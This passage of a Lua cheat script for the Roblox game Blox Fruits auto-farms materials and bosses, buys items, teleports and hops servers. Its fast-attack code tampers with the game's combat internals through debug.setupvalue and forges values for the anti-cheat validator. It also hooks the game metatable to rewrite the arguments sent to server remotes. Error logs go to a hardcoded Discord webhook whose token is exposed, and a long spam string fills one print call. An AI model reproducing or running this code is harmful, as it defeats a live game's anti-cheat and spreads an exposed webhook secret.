                           elseif  eltrul["Superhuman"] > 399 and eltrul["Death Step"] > 399 and eltrul["Electric Claw"] > 399 and eltrul["Dragon Talon"] > 399 and eltrul["Sharkman Karate"] > 399 and not checkMelee"Godhuman" 
                             and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman") == "You seem strong. Bring me 20 Fish Tails, 20 Magma Ore, 10 Dragon Scales and 10 Mystic Droplets."  then
                          
                               buyMelee"ElectricClaw"
                             grggrgrggrgrgrggr = {

                            ["Fish Tail"] = 20,

                            ["Magma Ore"] = 20,
                            ["Dragon Scale"] = 10,
                            ["Mystic Droplet"] = 10
                        } 
                      print(0)
                         for l, g in pairs(grggrgrggrgrgrggr) do 
                           print(l, CheckMaterialCount(l), g)
                             if CheckMaterialCount(l) < g then 
                               if l == "Fish Tail" then
                                 
                                 print(3)
                                 MaterialMob={"Fishman Raider","Fishman Captain"} 
                                 set"Farming Until Reach 20x Fish Tail"
                                 TeleportSea(3)
                               elseif  l == "Magma Ore"  then 
                                 MaterialMob={"Magma Ninja"} 
                                 set"Farming Until Reach 20x Magma Ore"
                                 TeleportSea(2)
                               elseif  l == "Dragon Scale"  then 
                                 MaterialMob={"Dragon Crew Archer","Dragon Crew Warrior"}; 
                                 set"Farming Until Reach 10x Dragon Scale"
                                 TeleportSea(3)
                               elseif  l == "Mystic Droplet"  then 
                                 set"Farming Until Reach 10x Mystic Droplet"
                                 MaterialMob={"Water Fighter","Sea Soldier"}; 
                                 TeleportSea(2)
                                end
                                 repeat wait() 
                            
                                   
                                   for i, v in pairs(workspace.Enemies:GetChildren()) do
                                       if table.find(MaterialMob, v.Name)  then
                     print(4)
                                         click = true 
                                         BringMob(v)
                                        repeat wait() 
                                     print(5)
                                            to(getKillVector3(v.HumanoidRootPart.CFrame))
                                            stuff(v)
                                        
                                        until not skidymf(v)
                                        click = false
                                       end
                                   end
                          
                                 --    print(getMobLoadPos(MaterialMob[math.random(1, #MaterialMob)]:gsub(" %pLv. %d+%p", "")), MaterialMob[math.random(1, #MaterialMob)]:gsub(" %pLv. %d+%p", ""))
                                     to(getMobLoadPos(MaterialMob[math.random(1, #MaterialMob)]:gsub(" %pLv. %d+%p", "")))
                                   
                                 until CheckMaterialCount(l) >= g
                               end
                         end  
                             elseif c().ChestFarm and gnc() then 
                               set("Auto Chest")
                              
                                local chst = gnc()
                               
                                to(chst.CFrame)
                              pcall(function() 
                                if game.Players.LocalPlayer:DistanceFromCharacter(chst.Position) < 10 then
                                firetouchinterest(chst, game.Players.LocalPlayer.Character.PrimaryPart, 0) 
                                firetouchinterest(chst, game.Players.LocalPlayer.Character.PrimaryPart, 1) 
                                end
                                end)
                              
                             elseif  CheckSea(3) and ((checkitem"God's Chalice" and CheckMaterialCount"Conjured Cocoa" > 9) or (getPlayerLevel() > 2449 and c().Main["Auto Farming Cake Prince If Max Level"]["Enable"] and getPlayerFragments() < c().Main["Auto Farming Cake Prince If Max Level"]["Until"]) or checkitem"Sweet Chalice")  then
					
                if c().Main["Misc / Hop"].Enable and os.time() - script_time > c().Main["Misc / Hop"].Delay and not checkitem"Sweet Chalice" then 
                             HopServer() 
                             return; 
                             end
       
               spawn(function ()
                 game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SweetChaliceNpc") 
                 EquipWeaponName"Sweet Chalice"
                 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner") 
                 end)
                 isloaded2=false
                 for i, v in pairs(getsortedmon()) do 
                   if table.find(MobsCakePrince, v.Name) and skidymf(v)  then 
                     isloaded2=true
                     
                         BringMob(v)
                     click = true
                     repeat wait() 
                  
                         to(getKillVector3(v.HumanoidRootPart.CFrame)) 
                         stuff (v)
                         
               
                       until not skidymf(v)
                     click = false
                   end
                 end
                 
                 if not isloaded2  then 
                   
                   pcall(function() 
                     to(CFrame.new(-1820.0634765625, 210.74781799316406, -12297.49609375))
                   end) 
                 end
                 
                elseif not checkitem"God's Chalice" and not checkitem"Sweet Chalice" and hophophop then 
                           HopServer() 
                             elseif  CheckSea(3) and getPlayerLevel() > 2449 and c().Main["Auto Farming Bone If Max Level (After Cake Prince)"]["Enable"]  then 
                               set"Auto Farming Bone If Max Level (After Cake Prince)"
                         isloaded = false
                         if c().Main["Misc / Hop"].Enable and os.time() - script_time > c().Main["Misc / Hop"].Delay and not checkitem"Sweet Chalice" then 
                             HopServer() 
                             return; 
                             end
                             for i, v in pairs(getsortedmon()) do 
                    
                               end
                             for i, v in pairs(getsortedmon()) do 
                               if v and skidymf(v) and table.find(BoneMobs, v.Name)  then
                                 isloaded = true 
                                 BringMob(v)
                                 click = true 
                                 repeat wait ()

                                     to(getKillVector3(v.HumanoidRootPart.CFrame))
                                     stuff(v)
                                 
                                 until not skidymf(v)
                                 end
                             end  
                             if not isloaded  then 
                   spawn(function() 
                     
                     to(CFrame.new(-9504.8564453125, 172.14292907714844, 6057.259765625))
                   end)
                   
                   end
                             elseif  not game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible and not AutoRaid  then 
                           if c().Main["Misc / Hop"].Enable and os.time() - script_time > c().Main["Misc / Hop"].Delay and not checkitem"Sweet Chalice" then 
                             HopServer() 
                             return; 
                             end 
                           local check155 = tick()
                         
if getPlayerLevel() > 700 and CheckSea(1) then 
  TeleportSea(2) 
  end
if getPlayerLevel() > 1500 and (moctui(3) or not table.find(backi, tostring(lp.Data.Race.Value))) and (checkitem"Rengoku" or not c().Main["Staying On 2ne Sea Until Got Rengoku"]) then 
  
  TeleportSea(3) 
end 


                              end
                      --warn("Delay From This Thread: "..tick()-oti)
                         --  end)
             --    pcall(function () noti("Eslaped Time: "..tostring(os.time()-reach2))
              end, function (...) 
              mii = {...} 
              miii = mii[1]
              
              writefile("conmemaydi.txt",(readfile("conmemaydi.txt") or " ").. "\n"..(miii or " cant log").." | "..(tostring(m1) or "no").." | "..(tostring(m2) or "no"))
                         warn(...) 
                         spawn(function ()
                         PostWebhook("https://discord.com/api/webhooks/1148250879070310531/eOkXIZsij1FxJaEJHLfZaUvzWgD2NtMZa64HUeslwBcXPA7mwrc2DjfnlP9A2Y9MihiD", buglog(miii))
                         end)
               end)
          --   noti("Total Delay: "..os.time()-oldtimetime.."s")
                         --  if not ayu  then warn(mee) noti("Founded Error, Sending To Server...")
                          --   game:HttpGet("https://php-web-server.akishino1.repl.co?err="..mee or "cant catch error".."&un=")end 
                        
--                       timerun = 0
                    
            end end)
                      
spawn(function ()
  while not ggggggggggg or wait(3600*2) do 
    ggggggggggg = true
    for i, v in pairs(c()["Fruit"]["Misc / Fruit Sniping"]) do 
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetFruits")

                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseRawFruit", v) 
    end  
  end 
end)
                      
                       spawn(function ()
                        while task.wait() do  
                            pcall(function ()
                 waid1:SetText( m1 or "none")
                 waid2:SetText(m2 or "none"  )
                 
                            end)  
            
            gayz, z = pcall(function()
              if checkitem"Fire Essence" then 
                buyMelee"DragonTalon"
              end
              
              
                if getPlayerLevel() >= 2449 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk","Buy")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Geppo")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Buso")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Soru")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual Katana")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cutlass")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Slingshot")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Flintlock")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual-Headed Blade")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Iron Mace")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Black Cape")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Bisento")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Tomoe Ring")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Katana")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Triple Katana")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Pipe")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Soul Cane")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Tomoe Ring")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Black Cape")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Swordsman Hat")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Slingshot")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Musket")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Flintlock")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Flintlock")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cannon")
                end
            end)
        
                          inv = game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")
                       
                         -- warn(moctui(1), moctui(2), moctui(3))
                       
                          
                         
                           if not game.Players.LocalPlayer.Character:FindFirstChild"Spin" then 
                             local s = Instance.new("BodyAngularVelocity")
                             s.Name = "Spin" 
                             s.Parent = game.Players.LocalPlayer.Character
                             s.MaxTorque = Vector3.new(0,math.huge,0) 
                             s.AngularVelocity = Vector3.new(0,40,0) 
                             end
                           if getgenv().ForceStop then return end
                           getMeleeMastery()
                           spawn(function ()
                           if c().Fruit["Misc / Fruit Looting"] then
                              game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Cousin","Buy")
                           end

                           local args = {
                              [1] = "AddPoint",
                              [2] = autopoint() or "Melee",
                              [3] = 300
                           }
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                           --		print (GetAndCheckMeleeMastery("Black Leg"), checkMelee"Electro")
                           storefruit()
                           end)

                            if checkitem"Flower 3" then
                                  
                                         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "3") 
                            
                                       end
                           if eltrul["Black Leg"] < 300 and NameMelee(true) ~= "Black Leg" then
                          
                              buyMelee("BlackLeg")
                           end
                           if eltrul["Black Leg"] > 299 and eltrul["Electro"] < 299 then

                              buyMelee("Electro")
                           end
                           if eltrul["Electro"] > 299 and eltrul["Fishman Karate"] < 299 then

                              buyMelee("FishmanKarate")
        
                           end
                           if eltrul["Fishman Karate"] > 299 and eltrul["Dragon Claw"] < 299 then
                             
                              if lp.Data.Fragments.Value < 1500 and (NameMelee(true).Name~= "Dragon Claw" and not checkMelee"Dragon Claw")  then
                                 if not CheckSea(1) then

                               
                                    --warn("Auto Raid Until Reach 1.5k f ", 6000)
                                    AutoRaid = true
                                    PullFruit = true
                                  
                                 else
                                    TeleportSea(2)
                                 end

                              end
                              
                              buyMelee("DragonClaw")
                           end
                           if eltrul["Dragon Claw"] > 299 and eltrul["Superhuman"] < 400 then
                              buyMelee"Superhuman" 
                           end
                        --   print("ok", eltrul["Superhuman"],eltrul["Death Step"])
                           if eltrul["Superhuman"] > 399 and eltrul["Death Step"] < 400 then
                             print("ok2")
                              if eltrul["Black Leg"] < 400 then
                                 buyMelee"BlackLeg" 
                              else
                                 if not checkMelee"DeathStep" then
                                    if getPlayerFragments() < 5000 and (NameMelee() ~= "Death Step" and not checkMelee"DeathStep") then
                                    --  warn("Auto Raid Until Hit 5000f sbhshshshshs",9999)
                                       AutoRaid = true
                                       PullFruit = true
                                    else
                                       
                                       set1"Waiting For Player Beli Hit 3M+ [Death Step]"
                                       if getPlayerBeli() > 3000000 then
                                          buyMelee"DeathStep"
                                       end
                                    end
                                 else
                                   
                                    buyMelee"DeathStep"
                                 end
                              end
                           end
                           if eltrul["Death Step"] > 399 and eltrul["Sharkman Karate"] < 400 then
                              if eltrul["Fishman Karate"] < 400 then
                                 buyMelee"FishmanKarate" 
                              else
                                 if not checkMelee"SharkmanKarate" then
                                    if getPlayerFragments() < 5000 then
                                       AutoRaid = true 
                                       PullFruit = true
                                    else
                                 set1"Waiting For Beli Hit 3M+ [Sharkman Karare]"
                                       if getPlayerBeli() > 3000000 then
                                          buyMelee"SharkmanKarate"

                                       end
                                    end
                                 else
                                    buyMelee"SharkmanKarate"
                                 end
                              end
                           end
                            if eltrul["Sharkman Karate"] > 399 and eltrul["Electric Claw"] < 400 then
                               if eltrul["Electro"] < 400 then 
                                 buyMelee"Electro" 
                               else 
                                 if not checkMelee"FishmanKarate" and getPlayerFragments() < 5000 then 
                                   AutoRaid = true 
                                   PullFruit = true
                                 end 
                                 buyMelee"ElectricClaw" 

                               end
                            end
                            if eltrul["Electric Claw"] > 399 and eltrul["Dragon Talon"] < 400 then
                                if eltrul["Dragon Claw"] < 400 then 
        
                                  buyMelee"DragonClaw" 
                                  else 
                                    if not checkMelee"DragonTalon" and getPlayerFragments() < 5000 then 
                                      AutoRaid = true 
                                      PullFruit = true 
                                
                                      else 
        
                                        buyMelee"DragonTalon"
                                        end
                                  end 
                            end 
                            if eltrul["Superhuman"] > 399 and eltrul["Death Step"] > 399 and eltrul["Electric Claw"] > 399 and eltrul["Dragon Talon"] > 399 and eltrul["Sharkman Karate"] > 399 then 
                              if not checkMelee"Godhuman" then 
                             buyMelee"ElectricClaw"
                         if getPlayerFragments() < 5000 and not checkMelee"Godhuman" then 
                           AutoRaid = true 
                           PullFruit = true
                         end 
                         
                         buyMelee"Godhuman"
                       else 
           
                         if eltrul["Godhuman"] < 400 then
                           buyMelee"Godhuman" 
                           else  
                            
                         for i, v in pairs(inv) do
                           if v.Type == "Sword" then
                          -- warn(i, v, v.Type, v.MasteryRequirements.Z)
                             mas = 0
                           for i2,v2 in pairs(v.MasteryRequirements) do 
                           --  warn(i2, v2)
                            mas = tonumber(v2)
                           end
                           --warn(v.Mastery, mas)
                           if v.Mastery < mas then 
                             forcewp = "Sword" 
                             if not checkitem2(v.Name) then
                             local args = {
    [1] = "LoadItem",
    [2] = v.Name
}
set1("Farming Mastery For "..v.Name.." ["..v.Mastery.."/"..mas.."]")
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args)) 
end
break
end 
                           end
                         end
                         end
                       end
                              end 
                              
                        end
                        end)





local adupi = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework")))[2]
local aP = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
local aQ = getupvalues(aP)[2]
local aR = require(game:GetService("Players")["LocalPlayer"].PlayerScripts.CombatFramework.RigController)
local aS = getupvalues(aR)[2]
local aT = require(game.ReplicatedStorage.CombatFramework.RigLib)
local aU = tick()
function CameraShaker()
	task.spawn(
		function()
			local b9 = require(game.Players.LocalPlayer.PlayerScripts.CombatFramework.CameraShaker)
			while wait() do
				pcall(
					function()
						b9.CameraShakeInstance.CameraShakeState.Inactive = 0
					end
				)
			end
		end
	)
end

function CurrentWeapon()
	local ac = aQ.activeController
	local aW = ac.blades[1]
	if not aW then
		return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
	end
	pcall(
		function()
			while aW.Parent ~= game.Players.LocalPlayer.Character do
				aW = aW.Parent
			end
		end
	)
	if not aW then
		return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
	end
	return aW
end
function getAllBladeHitsPlayers(aX)
	Hits = {}
	local aY = game.Players.LocalPlayer
	local aZ = game:GetService("Workspace").Characters:GetChildren()
	for r = 1, #aZ do
		local v = aZ[r]
		Human = v:FindFirstChildOfClass("Humanoid")
		if
			v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and
				aY:DistanceFromCharacter(Human.RootPart.Position) < aX + 5
		 then
			table.insert(Hits, Human.RootPart)
		end
	end
	return Hits
end
function getAllBladeHits(aX)
	Hits = {}
	local aY = game.Players.LocalPlayer
	local a_ = game:GetService("Workspace").Enemies:GetChildren()
	for r = 1, #a_ do
		local v = a_[r]
		Human = v:FindFirstChildOfClass("Humanoid")
		if
			Human and Human.RootPart and Human.Health > 0 and
				aY:DistanceFromCharacter(Human.RootPart.Position) < aX + 5
		 then
			table.insert(Hits, Human.RootPart)
		end
	end
	return Hits
end
ReturnFunctions = {}
function CurrentWeapon()
	local ac = aQ.activeController
	local aW = ac.blades[1]
	if not aW then
		return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
	end
	pcall(
		function()
			while aW.Parent ~= game.Players.LocalPlayer.Character do
				aW = aW.Parent
			end
		end
	)
	if not aW then
		return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
	end
	return aW
end
function getAllBladeHitsPlayers(aX)
	Hits = {}
	local aY = game.Players.LocalPlayer
	local aZ = game:GetService("Workspace").Characters:GetChildren()
	for r = 1, #aZ do
		local v = aZ[r]
		Human = v:FindFirstChildOfClass("Humanoid")
		if
			v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and
				aY:DistanceFromCharacter(Human.RootPart.Position) < aX + 5
		 then
			table.insert(Hits, Human.RootPart)
		end
	end
	return Hits
end
function lonmemaytofff(aX)
	Hits = {}
	local aY = game.Players.LocalPlayer
	local a_ = game:GetService("Workspace").Enemies:GetChildren()
	for r = 1, #a_ do
		local v = a_[r]
		Human = v:FindFirstChildOfClass("Humanoid")
		if
			Human and Human.RootPart and Human.Health > 0 and Human.Health ~= Human.MaxHealth and
				aY:DistanceFromCharacter(Human.RootPart.Position) < aX + 5
		 then
			table.insert(Hits, Human.RootPart)
		end
	end
	return Hits
end 

function AttackFunctgggggion()
	pcall(
		function()
			if game.Players.LocalPlayer.Character.Stun.Value ~= 0 then
				return nil
			end
			local ac = aQ.activeController
			ac.hitboxMagnitude = 55
			if ac and ac.equipped then
				for b0 = 1, 1 do
					local b2 =
						require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
						game.Players.LocalPlayer.Character,
						{game.Players.LocalPlayer.Character.HumanoidRootPart},
						60
					)
					if #b2 > 0 then
						local b3 = debug.getupvalue(ac.attack, 5)
						local b4 = debug.getupvalue(ac.attack, 6)
						local b5 = debug.getupvalue(ac.attack, 4)
						local b6 = debug.getupvalue(ac.attack, 7)
						local b7 = (b3 * 798405 + b5 * 727595) % b4
						local b8 = b5 * 798405
						(function()
							b7 = (b7 * b4 + b8) % 1099511627776
							b3 = math.floor(b7 / b4)
							b5 = b7 - b3 * b4
						end)()
						b6 = b6 + 1
						debug.setupvalue(ac.attack, 5, b3)
						debug.setupvalue(ac.attack, 6, b4)
						debug.setupvalue(ac.attack, 4, b5)
						debug.setupvalue(ac.attack, 7, b6)
						for k, v in pairs(ac.animator.anims.basic) do
							v:Play()
						end 
						
						if
							game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and ac.blades and
								ac.blades[1]
						 then
							game:GetService("ReplicatedStorage").RigControllerEvent:FireServer(
								"weaponChange",
								tostring(CurrentWeapon())
							)
							game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(b7 / 1099511627776 * 16777215), b6+1)
							game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", b2, 2, "")
							
						end
					end
				end
			end
		end
	)
end

spawn(function()
    while task.wait(c().Misc["Fast Attack Delay"])do
          pcall(function()
           
               AttackFunctgggggion() 
               ot = tick()
               if adupi.activeController then
                -- if v.Humanoid.Health > 0 then
                    adupi.activeController.timeToNextAttack = math.huge
                    adupi.activeController.focusStart = 0
                    adupi.activeController.hitboxMagnitude = 120
                    adupi.activeController.humanoid.AutoRotate = true
                    adupi.activeController.increment = 1 + 1 / 1
                -- end
            end
          end)
      end
    end) 
            game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
            if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
               print("Unique | Rejoin! omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg skidded omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg omg ")
               game:GetService("TeleportService"):Teleport(game.PlaceId)
            end
function getsortedmon()
    local beo = game.Players.LocalPlayer
    local memay = beo.Character:WaitForChild"HumanoidRootPart"
    local chim = workspace.Enemies: GetChildren ()
    local bamaysuccac = {} 
    for i, v in pairs(chim) do 
      if v.Name ~= "PirateBasic" and v.Name ~= "PirateBrigade" and v:FindFirstChild"HumanoidRootPart" then 
        table.insert(bamaysuccac, v) 
       end
      end
    table.sort(bamaysuccac, function(aL, aM)
      
        return beo: DistanceFromCharacter(aL.HumanoidRootPart.Position) < beo: DistanceFromCharacter (aM.HumanoidRootPart.Position) 
    end)
   
   return bamaysuccac

-- return bamaysuccac or game.Workspace.Enemies:GetChildren()
end
           

--if not elt then warn(rul) game:HttpGet("https://php-web-server.akishino1.repl.co/?err="..rul.."&un="..game.Players.LocalPlayer.Name) end 
end)
spawn(function()
    local gg = getrawmetatable(game)
    local old = gg.__namecall
    setreadonly(gg,false)
    gg.__namecall = newcclosure(function(...)
        local method = getnamecallmethod()
        local args = {...}
        if tostring(method) == "FireServer" then
            if tostring(args[1]) == "RemoteEvent" then
                if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
                    if dmlockskill then
                        args[2] = dmlockskill
                        return old(unpack(args))
                    end
                end
            end
        end
        return old(...)
    end)
end)
